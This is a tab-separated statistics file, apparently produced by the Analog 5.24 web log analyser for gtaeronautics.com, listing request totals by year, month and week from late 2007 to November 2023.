x	VE	analog 5.24
x	HN	gtaeronautics.com
x	PS	2023	11	06	01	59
x	FR	2007	12	18	17	05
x	LR	2023	11	05	04	46
x	E7	2023	11	06	01	59
x	SR	1491607
x	S7	9669
x	NC	543354
x	C7	0
x	FL	548342
x	F7	577
x	RR	218
x	R7	0
x	NH	106142
x	H7	424
x	BT	57520368399
x	B7	0
1	Rr	398609	26.723	2023
1	Rr	82334	5.520	2022
1	Rr	98917	6.632	2021
1	Rr	89380	5.992	2020
1	Rr	80088	5.369	2019
1	Rr	68927	4.621	2018
1	Rr	60168	4.034	2017
1	Rr	73316	4.915	2016
1	Rr	80796	5.417	2015
1	Rr	110773	7.426	2014
1	Rr	65173	4.369	2013
1	Rr	60742	4.072	2012
1	Rr	57015	3.822	2011
1	Rr	22139	1.484	2010
1	Rr	69710	4.673	2009
1	Rr	71820	4.815	2008
1	Rr	1700	0.114	2007
1	*BT	R	398609	2023
m	Rr	3378	0.226	2018	04
m	Rr	5789	0.388	2018	03
m	Rr	5369	0.360	2018	02
m	Rr	5574	0.374	2018	01
m	Rr	3906	0.262	2017	12
m	Rr	6533	0.438	2017	11
m	Rr	5498	0.369	2017	10
m	Rr	0	0.000	2017	09
m	Rr	0	0.000	2017	08
m	Rr	0	0.000	2017	07
m	Rr	0	0.000	2017	06
m	Rr	6832	0.458	2017	05
m	Rr	9999	0.670	2017	04
m	Rr	11887	0.797	2017	03
m	Rr	7941	0.532	2017	02
m	Rr	7572	0.508	2017	01
m	Rr	9483	0.636	2016	12
m	Rr	7121	0.477	2016	11
m	Rr	5510	0.369	2016	10
m	Rr	6288	0.422	2016	09
m	Rr	5888	0.395	2016	08
m	Rr	5445	0.365	2016	07
m	Rr	5042	0.338	2016	06
m	Rr	5495	0.368	2016	05
m	Rr	5341	0.358	2016	04
m	Rr	5558	0.373	2016	03
m	Rr	5548	0.372	2016	02
m	Rr	6597	0.442	2016	01
m	Rr	5574	0.374	2015	12
m	Rr	5330	0.357	2015	11
m	Rr	5671	0.380	2015	10
m	Rr	6196	0.415	2015	09
m	Rr	6788	0.455	2015	08
m	Rr	9120	0.611	2015	07
m	Rr	7156	0.480	2015	06
m	Rr	5694	0.382	2015	05
m	Rr	9635	0.646	2015	04
m	Rr	6215	0.417	2015	03
m	Rr	6084	0.408	2015	02
m	Rr	7333	0.492	2015	01
m	Rr	6608	0.443	2014	12
m	Rr	6997	0.469	2014	11
m	Rr	7537	0.505	2014	10
m	Rr	7043	0.472	2014	09
m	Rr	7324	0.491	2014	08
m	Rr	7905	0.530	2014	07
m	Rr	11654	0.781	2014	06
m	Rr	9211	0.618	2014	05
m	Rr	10588	0.710	2014	04
m	Rr	7817	0.524	2014	03
m	Rr	15229	1.021	2014	02
m	Rr	12860	0.862	2014	01
m	Rr	5325	0.357	2013	12
m	Rr	5513	0.370	2013	11
m	Rr	5598	0.375	2013	10
m	Rr	4655	0.312	2013	09
m	Rr	4938	0.331	2013	08
m	Rr	5623	0.377	2013	07
m	Rr	5492	0.368	2013	06
m	Rr	5211	0.349	2013	05
m	Rr	5842	0.392	2013	04
m	Rr	6068	0.407	2013	03
m	Rr	5055	0.339	2013	02
m	Rr	5853	0.392	2013	01
m	Rr	5688	0.381	2012	12
m	Rr	5477	0.367	2012	11
m	Rr	5413	0.363	2012	10
m	Rr	4331	0.290	2012	09
m	Rr	3866	0.259	2012	08
m	Rr	4314	0.289	2012	07
m	Rr	4655	0.312	2012	06
m	Rr	6047	0.405	2012	05
m	Rr	5114	0.343	2012	04
m	Rr	6128	0.411	2012	03
m	Rr	5430	0.364	2012	02
m	Rr	4279	0.287	2012	01
m	Rr	5548	0.372	2011	12
m	Rr	4779	0.320	2011	11
m	Rr	5117	0.343	2011	10
m	Rr	5431	0.364	2011	09
m	Rr	6256	0.419	2011	08
m	Rr	5699	0.382	2011	07
m	Rr	5420	0.363	2011	06
m	Rr	3975	0.266	2011	05
m	Rr	0	0.000	2011	04
m	Rr	3608	0.242	2011	03
m	Rr	5171	0.347	2011	02
m	Rr	6011	0.403	2011	01
m	Rr	1603	0.107	2010	12
m	Rr	0	0.000	2010	11
m	Rr	0	0.000	2010	10
m	Rr	0	0.000	2010	09
m	Rr	0	0.000	2010	08
m	Rr	0	0.000	2010	07
m	Rr	4101	0.275	2010	06
m	Rr	5018	0.336	2010	05
m	Rr	4928	0.330	2010	04
m	Rr	5095	0.342	2010	03
m	Rr	1394	0.093	2010	02
m	Rr	0	0.000	2010	01
m	Rr	4665	0.313	2009	12
m	Rr	6187	0.415	2009	11
m	Rr	5498	0.369	2009	10
m	Rr	5066	0.340	2009	09
m	Rr	5718	0.383	2009	08
m	Rr	7436	0.499	2009	07
m	Rr	5685	0.381	2009	06
m	Rr	6120	0.410	2009	05
m	Rr	5310	0.356	2009	04
m	Rr	5515	0.370	2009	03
m	Rr	6123	0.410	2009	02
m	Rr	6387	0.428	2009	01
m	Rr	5763	0.386	2008	12
m	Rr	5420	0.363	2008	11
m	Rr	4722	0.317	2008	10
m	Rr	5435	0.364	2008	09
m	Rr	4843	0.325	2008	08
m	Rr	5382	0.361	2008	07
m	Rr	6082	0.408	2008	06
m	Rr	9946	0.667	2008	05
m	Rr	6420	0.430	2008	04
m	Rr	5431	0.364	2008	03
m	Rr	6469	0.434	2008	02
m	Rr	5907	0.396	2008	01
m	Rr	1700	0.114	2007	12
m	*BT	R	66204	2023	06
W	Rr	74	0.005	2023	11	05
W	Rr	11167	0.749	2023	10	29
W	Rr	13980	0.937	2023	10	22
W	Rr	15450	1.036	2023	10	15
W	Rr	14713	0.986	2023	10	08
W	Rr	14285	0.958	2023	10	01
W	Rr	14478	0.971	2023	09	24
W	Rr	11904	0.798	2023	09	17
W	Rr	10968	0.735	2023	09	10
W	Rr	10482	0.703	2023	09	03
W	Rr	10800	0.724	2023	08	27
W	Rr	14568	0.977	2023	08	20
W	Rr	12504	0.838	2023	08	13
W	Rr	12076	0.810	2023	08	06
W	Rr	10997	0.737	2023	07	30
W	Rr	13392	0.898	2023	07	23
W	Rr	13224	0.887	2023	07	16
W	Rr	16128	1.081	2023	07	09
W	Rr	13356	0.895	2023	07	02
W	Rr	12558	0.842	2023	06	25
W	Rr	17082	1.145	2023	06	18
W	Rr	16452	1.103	2023	06	11
W	Rr	15336	1.028	2023	06	04
W	Rr	13482	0.904	2023	05	28
W	Rr	16248	1.089	2023	05	21
W	Rr	15078	1.011	2023	05	14
W	Rr	17181	1.152	2023	05	07
W	Rr	4282	0.287	2023	04	30
W	Rr	2458	0.165	2023	04	23
W	Rr	2269	0.152	2023	04	16
W	Rr	1553	0.104	2023	04	09
W	Rr	2389	0.160	2023	04	02
W	Rr	1701	0.114	2023	03	26
W	Rr	1943	0.130	2023	03	19
W	Rr	2225	0.149	2023	03	12
W	Rr	2192	0.147	2023	03	05
W	Rr	4055	0.272	2023	02	26
W	Rr	2406	0.161	2023	02	19
W	Rr	1898	0.127	2023	02	12
W	Rr	1890	0.127	2023	02	05
W	Rr	1861	0.125	2023	01	29
W	Rr	1686	0.113	2023	01	22
W	Rr	1779	0.119	2023	01	15
W	Rr	1833	0.123	2023	01	08
W	Rr	2226	0.149	2023	01	01
W	Rr	1280	0.086	2022	12	25
W	Rr	1806	0.121	2022	12	18
W	Rr	1773	0.119	2022	12	11
W	Rr	1532	0.103	2022	12	04
W	Rr	1586	0.106	2022	11	27
W	Rr	1093	0.073	2022	11	20
W	Rr	1366	0.092	2022	11	13
W	Rr	1972	0.132	2022	11	06
W	Rr	1396	0.094	2022	10	30
W	Rr	1547	0.104	2022	10	23
W	Rr	1641	0.110	2022	10	16
W	Rr	1747	0.117	2022	10	09
W	Rr	1568	0.105	2022	10	02
W	Rr	1379	0.092	2022	09	25
W	Rr	1695	0.114	2022	09	18
W	Rr	1701	0.114	2022	09	11
W	Rr	1568	0.105	2022	09	04
W	Rr	1562	0.105	2022	08	28
W	Rr	1488	0.100	2022	08	21
W	Rr	1646	0.110	2022	08	14
W	Rr	1430	0.096	2022	08	07
W	Rr	1446	0.097	2022	07	31
W	Rr	1383	0.093	2022	07	24
W	Rr	1661	0.111	2022	07	17
W	Rr	1478	0.099	2022	07	10
W	Rr	1711	0.115	2022	07	03
W	Rr	1804	0.121	2022	06	26
W	Rr	1298	0.087	2022	06	19
W	Rr	1407	0.094	2022	06	12
W	Rr	1396	0.094	2022	06	05
W	Rr	1638	0.110	2022	05	29
W	Rr	1724	0.116	2022	05	22
W	Rr	2427	0.163	2022	05	15
W	Rr	2100	0.141	2022	05	08
W	Rr	1414	0.095	2022	05	01
W	Rr	1865	0.125	2022	04	24
W	Rr	1381	0.093	2022	04	17
W	Rr	1630	0.109	2022	04	10
W	Rr	1670	0.112	2022	04	03
W	Rr	1588	0.106	2022	03	27
W	Rr	1204	0.081	2022	03	20
W	Rr	1350	0.091	2022	03	13
W	Rr	1488	0.100	2022	03	06
W	Rr	1368	0.092	2022	02	27
W	Rr	1481	0.099	2022	02	20
W	Rr	1657	0.111	2022	02	13
W	Rr	1518	0.102	2022	02	06
W	Rr	1787	0.120	2022	01	30
W	Rr	2021	0.135	2022	01	23
W	Rr	1429	0.096	2022	01	16
W	Rr	1693	0.114	2022	01	09
W	Rr	1541	0.103	2022	01	02
W	Rr	1311	0.088	2021	12	26
W	Rr	1839	0.123	2021	12	19
W	Rr	1732	0.116	2021	12	12
W	Rr	2001	0.134	2021	12	05
W	Rr	1641	0.110	2021	11	28
W	Rr	1615	0.108	2021	11	21
W	Rr	1673	0.112	2021	11	14
W	Rr	1625	0.109	2021	11	07
W	Rr	1523	0.102	2021	10	31
W	Rr	1562	0.105	2021	10	24
W	Rr	1474	0.099	2021	10	17
W	Rr	1349	0.090	2021	10	10
W	Rr	1615	0.108	2021	10	03
W	Rr	1598	0.107	2021	09	26
W	Rr	1646	0.110	2021	09	19
W	Rr	1203	0.081	2021	09	12
W	Rr	1106	0.074	2021	09	05
W	Rr	1383	0.093	2021	08	29
W	Rr	1685	0.113	2021	08	22
W	Rr	2071	0.139	2021	08	15
W	Rr	2279	0.153	2021	08	08
W	Rr	2374	0.159	2021	08	01
W	Rr	2543	0.170	2021	07	25
W	Rr	2843	0.191	2021	07	18
W	Rr	2777	0.186	2021	07	11
W	Rr	2756	0.185	2021	07	04
W	Rr	2524	0.169	2021	06	27
W	Rr	2466	0.165	2021	06	20
W	Rr	2262	0.152	2021	06	13
W	Rr	2264	0.152	2021	06	06
W	Rr	2101	0.141	2021	05	30
W	Rr	3009	0.202	2021	05	23
W	Rr	1989	0.133	2021	05	16
W	Rr	2386	0.160	2021	05	09
W	Rr	2138	0.143	2021	05	02
W	Rr	1668	0.112	2021	04	25
W	Rr	2413	0.162	2021	04	18
W	Rr	3035	0.203	2021	04	11
W	Rr	2709	0.182	2021	04	04
W	Rr	1942	0.130	2021	03	28
W	Rr	1666	0.112	2021	03	21
W	Rr	1476	0.099	2021	03	14
W	Rr	1713	0.115	2021	03	07
W	Rr	1777	0.119	2021	02	28
W	Rr	1173	0.079	2021	02	21
W	Rr	1101	0.074	2021	02	14
W	Rr	1699	0.114	2021	02	07
W	Rr	1867	0.125	2021	01	31
W	Rr	1404	0.094	2021	01	24
W	Rr	1564	0.105	2021	01	17
W	Rr	1431	0.096	2021	01	10
W	Rr	1666	0.112	2021	01	03
W	Rr	1926	0.129	2020	12	27
W	Rr	1572	0.105	2020	12	20
W	Rr	1404	0.094	2020	12	13
W	Rr	2272	0.152	2020	12	06
W	Rr	1522	0.102	2020	11	29
W	Rr	1722	0.115	2020	11	22
W	Rr	1580	0.106	2020	11	15
W	Rr	1401	0.094	2020	11	08
W	Rr	1499	0.100	2020	11	01
W	Rr	1470	0.099	2020	10	25
W	Rr	2379	0.159	2020	10	18
W	Rr	1559	0.105	2020	10	11
W	Rr	1729	0.116	2020	10	04
W	Rr	1674	0.112	2020	09	27
W	Rr	1786	0.120	2020	09	20
W	Rr	2200	0.147	2020	09	13
W	Rr	1677	0.112	2020	09	06
W	Rr	1596	0.107	2020	08	30
W	Rr	1833	0.123	2020	08	23
W	Rr	1814	0.122	2020	08	16
W	Rr	2206	0.148	2020	08	09
W	Rr	1397	0.094	2020	08	02
W	Rr	1816	0.122	2020	07	26
W	Rr	1949	0.131	2020	07	19
W	Rr	1532	0.103	2020	07	12
W	Rr	1976	0.132	2020	07	05
W	Rr	1600	0.107	2020	06	28
W	Rr	1627	0.109	2020	06	21
W	Rr	2101	0.141	2020	06	14
W	Rr	1590	0.107	2020	06	07
W	Rr	1492	0.100	2020	05	31
W	Rr	1556	0.104	2020	05	24
W	Rr	1756	0.118	2020	05	17
W	Rr	1568	0.105	2020	05	10
W	Rr	1567	0.105	2020	05	03
W	Rr	1734	0.116	2020	04	26
W	Rr	1675	0.112	2020	04	19
W	Rr	1702	0.114	2020	04	12
W	Rr	1965	0.132	2020	04	05
W	Rr	1329	0.089	2020	03	29
W	Rr	1818	0.122	2020	03	22
W	Rr	1345	0.090	2020	03	15
W	Rr	1581	0.106	2020	03	08
W	Rr	2014	0.135	2020	03	01
W	Rr	1942	0.130	2020	02	23
W	Rr	1748	0.117	2020	02	16
W	Rr	1949	0.131	2020	02	09
W	Rr	1683	0.113	2020	02	02
W	Rr	1436	0.096	2020	01	26
W	Rr	1792	0.120	2020	01	19
W	Rr	1519	0.102	2020	01	12
W	Rr	1420	0.095	2020	01	05
W	Rr	1109	0.074	2019	12	29
W	Rr	1023	0.069	2019	12	22
W	Rr	1584	0.106	2019	12	15
W	Rr	1783	0.120	2019	12	08
W	Rr	1704	0.114	2019	12	01
W	Rr	1178	0.079	2019	11	24
W	Rr	1697	0.114	2019	11	17
W	Rr	1510	0.101	2019	11	10
W	Rr	1383	0.093	2019	11	03
W	Rr	1309	0.088	2019	10	27
W	Rr	1473	0.099	2019	10	20
W	Rr	1519	0.102	2019	10	13
W	Rr	1485	0.100	2019	10	06
W	Rr	1416	0.095	2019	09	29
W	Rr	1499	0.100	2019	09	22
W	Rr	1652	0.111	2019	09	15
W	Rr	1710	0.115	2019	09	08
W	Rr	1485	0.100	2019	09	01
W	Rr	1689	0.113	2019	08	25
W	Rr	1315	0.088	2019	08	18
W	Rr	1619	0.109	2019	08	11
W	Rr	1558	0.104	2019	08	04
W	Rr	1360	0.091	2019	07	28
W	Rr	1191	0.080	2019	07	21
W	Rr	1730	0.116	2019	07	14
W	Rr	1299	0.087	2019	07	07
W	Rr	1339	0.090	2019	06	30
W	Rr	1592	0.107	2019	06	23
W	Rr	1497	0.100	2019	06	16
W	Rr	1450	0.097	2019	06	09
W	Rr	1555	0.104	2019	06	02
W	Rr	1289	0.086	2019	05	26
W	Rr	1863	0.125	2019	05	19
W	Rr	1385	0.093	2019	05	12
W	Rr	1553	0.104	2019	05	05
W	Rr	1655	0.111	2019	04	28
W	Rr	1282	0.086	2019	04	21
W	Rr	1503	0.101	2019	04	14
W	Rr	1623	0.109	2019	04	07
W	Rr	1715	0.115	2019	03	31
W	Rr	1882	0.126	2019	03	24
W	Rr	1464	0.098	2019	03	17
W	Rr	1381	0.093	2019	03	10
W	Rr	1627	0.109	2019	03	03
W	Rr	1773	0.119	2019	02	24
W	Rr	1669	0.112	2019	02	17
W	Rr	1483	0.099	2019	02	10
W	Rr	1391	0.093	2019	02	03
W	Rr	1797	0.120	2019	01	27
W	Rr	1963	0.132	2019	01	20
W	Rr	2029	0.136	2019	01	13
W	Rr	1696	0.114	2019	01	06
W	Rr	1526	0.102	2018	12	30
W	Rr	1226	0.082	2018	12	23
W	Rr	1442	0.097	2018	12	16
W	Rr	1936	0.130	2018	12	09
W	Rr	1809	0.121	2018	12	02
W	Rr	1295	0.087	2018	11	25
W	Rr	1820	0.122	2018	11	18
W	Rr	1802	0.121	2018	11	11
W	Rr	0	0.000	2018	11	04
W	Rr	1473	0.099	2018	10	28
W	Rr	1106	0.074	2018	10	21
W	Rr	1427	0.096	2018	10	14
W	Rr	1214	0.081	2018	10	07
W	Rr	1168	0.078	2018	09	30
W	Rr	1420	0.095	2018	09	23
W	Rr	1197	0.080	2018	09	16
W	Rr	1388	0.093	2018	09	09
W	Rr	1320	0.088	2018	09	02
W	Rr	1246	0.084	2018	08	26
W	Rr	1214	0.081	2018	08	19
W	Rr	1366	0.092	2018	08	12
W	Rr	1195	0.080	2018	08	05
W	Rr	1346	0.090	2018	07	29
W	Rr	1374	0.092	2018	07	22
W	Rr	1508	0.101	2018	07	15
W	Rr	1522	0.102	2018	07	08
W	Rr	909	0.061	2018	07	01
W	Rr	1444	0.097	2018	06	24
W	Rr	2682	0.180	2018	06	17
W	Rr	1365	0.092	2018	06	10
W	Rr	1329	0.089	2018	06	03
W	Rr	1275	0.085	2018	05	27
W	Rr	1392	0.093	2018	05	20
W	Rr	1321	0.089	2018	05	13
W	Rr	1527	0.102	2018	05	06
W	Rr	1517	0.102	2018	04	29
W	Rr	0	0.000	2018	04	22
W	Rr	1364	0.091	2018	04	15
W	Rr	1712	0.115	2018	04	08
W	Rr	0	0.000	2018	04	01
W	Rr	1543	0.103	2018	03	25
W	Rr	1342	0.090	2018	03	18
W	Rr	2429	0.163	2018	03	11
W	Rr	0	0.000	2018	03	04
W	Rr	1366	0.092	2018	02	25
W	Rr	1308	0.088	2018	02	18
W	Rr	1439	0.096	2018	02	11
W	Rr	1731	0.116	2018	02	04
W	Rr	0	0.000	2018	01	28
W	Rr	1434	0.096	2018	01	21
W	Rr	1578	0.106	2018	01	14
W	Rr	1471	0.099	2018	01	07
W	Rr	1246	0.084	2017	12	31
W	Rr	1033	0.069	2017	12	24
W	Rr	1103	0.074	2017	12	17
W	Rr	1406	0.094	2017	12	10
W	Rr	0	0.000	2017	12	03
W	Rr	1335	0.090	2017	11	26
W	Rr	1427	0.096	2017	11	19
W	Rr	1662	0.111	2017	11	12
W	Rr	1414	0.095	2017	11	05
W	Rr	1349	0.090	2017	10	29
W	Rr	1208	0.081	2017	10	22
W	Rr	2013	0.135	2017	10	15
W	Rr	1832	0.123	2017	10	08
W	Rr	0	0.000	2017	10	01
W	Rr	0	0.000	2017	09	24
W	Rr	0	0.000	2017	09	17
W	Rr	0	0.000	2017	09	10
W	Rr	0	0.000	2017	09	03
W	Rr	0	0.000	2017	08	27
W	Rr	0	0.000	2017	08	20
W	Rr	0	0.000	2017	08	13
W	Rr	0	0.000	2017	08	06
W	Rr	0	0.000	2017	07	30
W	Rr	0	0.000	2017	07	23
W	Rr	0	0.000	2017	07	16
W	Rr	0	0.000	2017	07	09
W	Rr	0	0.000	2017	07	02
W	Rr	0	0.000	2017	06	25
W	Rr	0	0.000	2017	06	18
W	Rr	0	0.000	2017	06	11
W	Rr	0	0.000	2017	06	04
W	Rr	25	0.002	2017	05	28
W	Rr	1838	0.123	2017	05	21
W	Rr	1915	0.128	2017	05	14
W	Rr	1676	0.112	2017	05	07
W	Rr	1677	0.112	2017	04	30
W	Rr	2071	0.139	2017	04	23
W	Rr	1978	0.133	2017	04	16
W	Rr	1874	0.126	2017	04	09
W	Rr	3435	0.230	2017	04	02
W	Rr	2619	0.176	2017	03	26
W	Rr	2633	0.177	2017	03	19
W	Rr	2413	0.162	2017	03	12
W	Rr	3092	0.207	2017	03	05
W	Rr	2295	0.154	2017	02	26
W	Rr	2204	0.148	2017	02	19
W	Rr	1869	0.125	2017	02	12
W	Rr	1973	0.132	2017	02	05
W	Rr	1783	0.120	2017	01	29
W	Rr	1768	0.119	2017	01	22
W	Rr	1585	0.106	2017	01	15
W	Rr	1768	0.119	2017	01	08
W	Rr	1740	0.117	2017	01	01
W	Rr	1549	0.104	2016	12	25
W	Rr	2202	0.148	2016	12	18
W	Rr	1812	0.121	2016	12	11
W	Rr	2648	0.178	2016	12	04
W	Rr	2236	0.150	2016	11	27
W	Rr	1321	0.089	2016	11	20
W	Rr	1996	0.134	2016	11	13
W	Rr	1716	0.115	2016	11	06
W	Rr	1564	0.105	2016	10	30
W	Rr	1362	0.091	2016	10	23
W	Rr	1707	0.114	2016	10	16
W	Rr	1696	0.114	2016	10	09
W	Rr	36	0.002	2016	10	02
W	Rr	2002	0.134	2016	09	25
W	Rr	1399	0.094	2016	09	18
W	Rr	1199	0.080	2016	09	11
W	Rr	1326	0.089	2016	09	04
W	Rr	1316	0.088	2016	08	28
W	Rr	1257	0.084	2016	08	21
W	Rr	1208	0.081	2016	08	14
W	Rr	1602	0.107	2016	08	07
W	Rr	1319	0.088	2016	07	31
W	Rr	1796	0.120	2016	07	24
W	Rr	1171	0.079	2016	07	17
W	Rr	1167	0.078	2016	07	10
W	Rr	917	0.061	2016	07	03
W	Rr	920	0.062	2016	06	26
W	Rr	1179	0.079	2016	06	19
W	Rr	1288	0.086	2016	06	12
W	Rr	1237	0.083	2016	06	05
W	Rr	1263	0.085	2016	05	29
W	Rr	1338	0.090	2016	05	22
W	Rr	1184	0.079	2016	05	15
W	Rr	1365	0.092	2016	05	08
W	Rr	974	0.065	2016	05	01
W	Rr	1311	0.088	2016	04	24
W	Rr	1127	0.076	2016	04	17
W	Rr	1248	0.084	2016	04	10
W	Rr	1451	0.097	2016	04	03
W	Rr	987	0.066	2016	03	27
W	Rr	1233	0.083	2016	03	20
W	Rr	1347	0.090	2016	03	13
W	Rr	1347	0.090	2016	03	06
W	Rr	1236	0.083	2016	02	28
W	Rr	1422	0.095	2016	02	21
W	Rr	1085	0.073	2016	02	14
W	Rr	1427	0.096	2016	02	07
W	Rr	1359	0.091	2016	01	31
W	Rr	1708	0.115	2016	01	24
W	Rr	1476	0.099	2016	01	17
W	Rr	1563	0.105	2016	01	10
W	Rr	1381	0.093	2016	01	03
W	Rr	1273	0.085	2015	12	27
W	Rr	1084	0.073	2015	12	20
W	Rr	1344	0.090	2015	12	13
W	Rr	1336	0.090	2015	12	06
W	Rr	1123	0.075	2015	11	29
W	Rr	960	0.064	2015	11	22
W	Rr	1337	0.090	2015	11	15
W	Rr	1400	0.094	2015	11	08
W	Rr	1383	0.093	2015	11	01
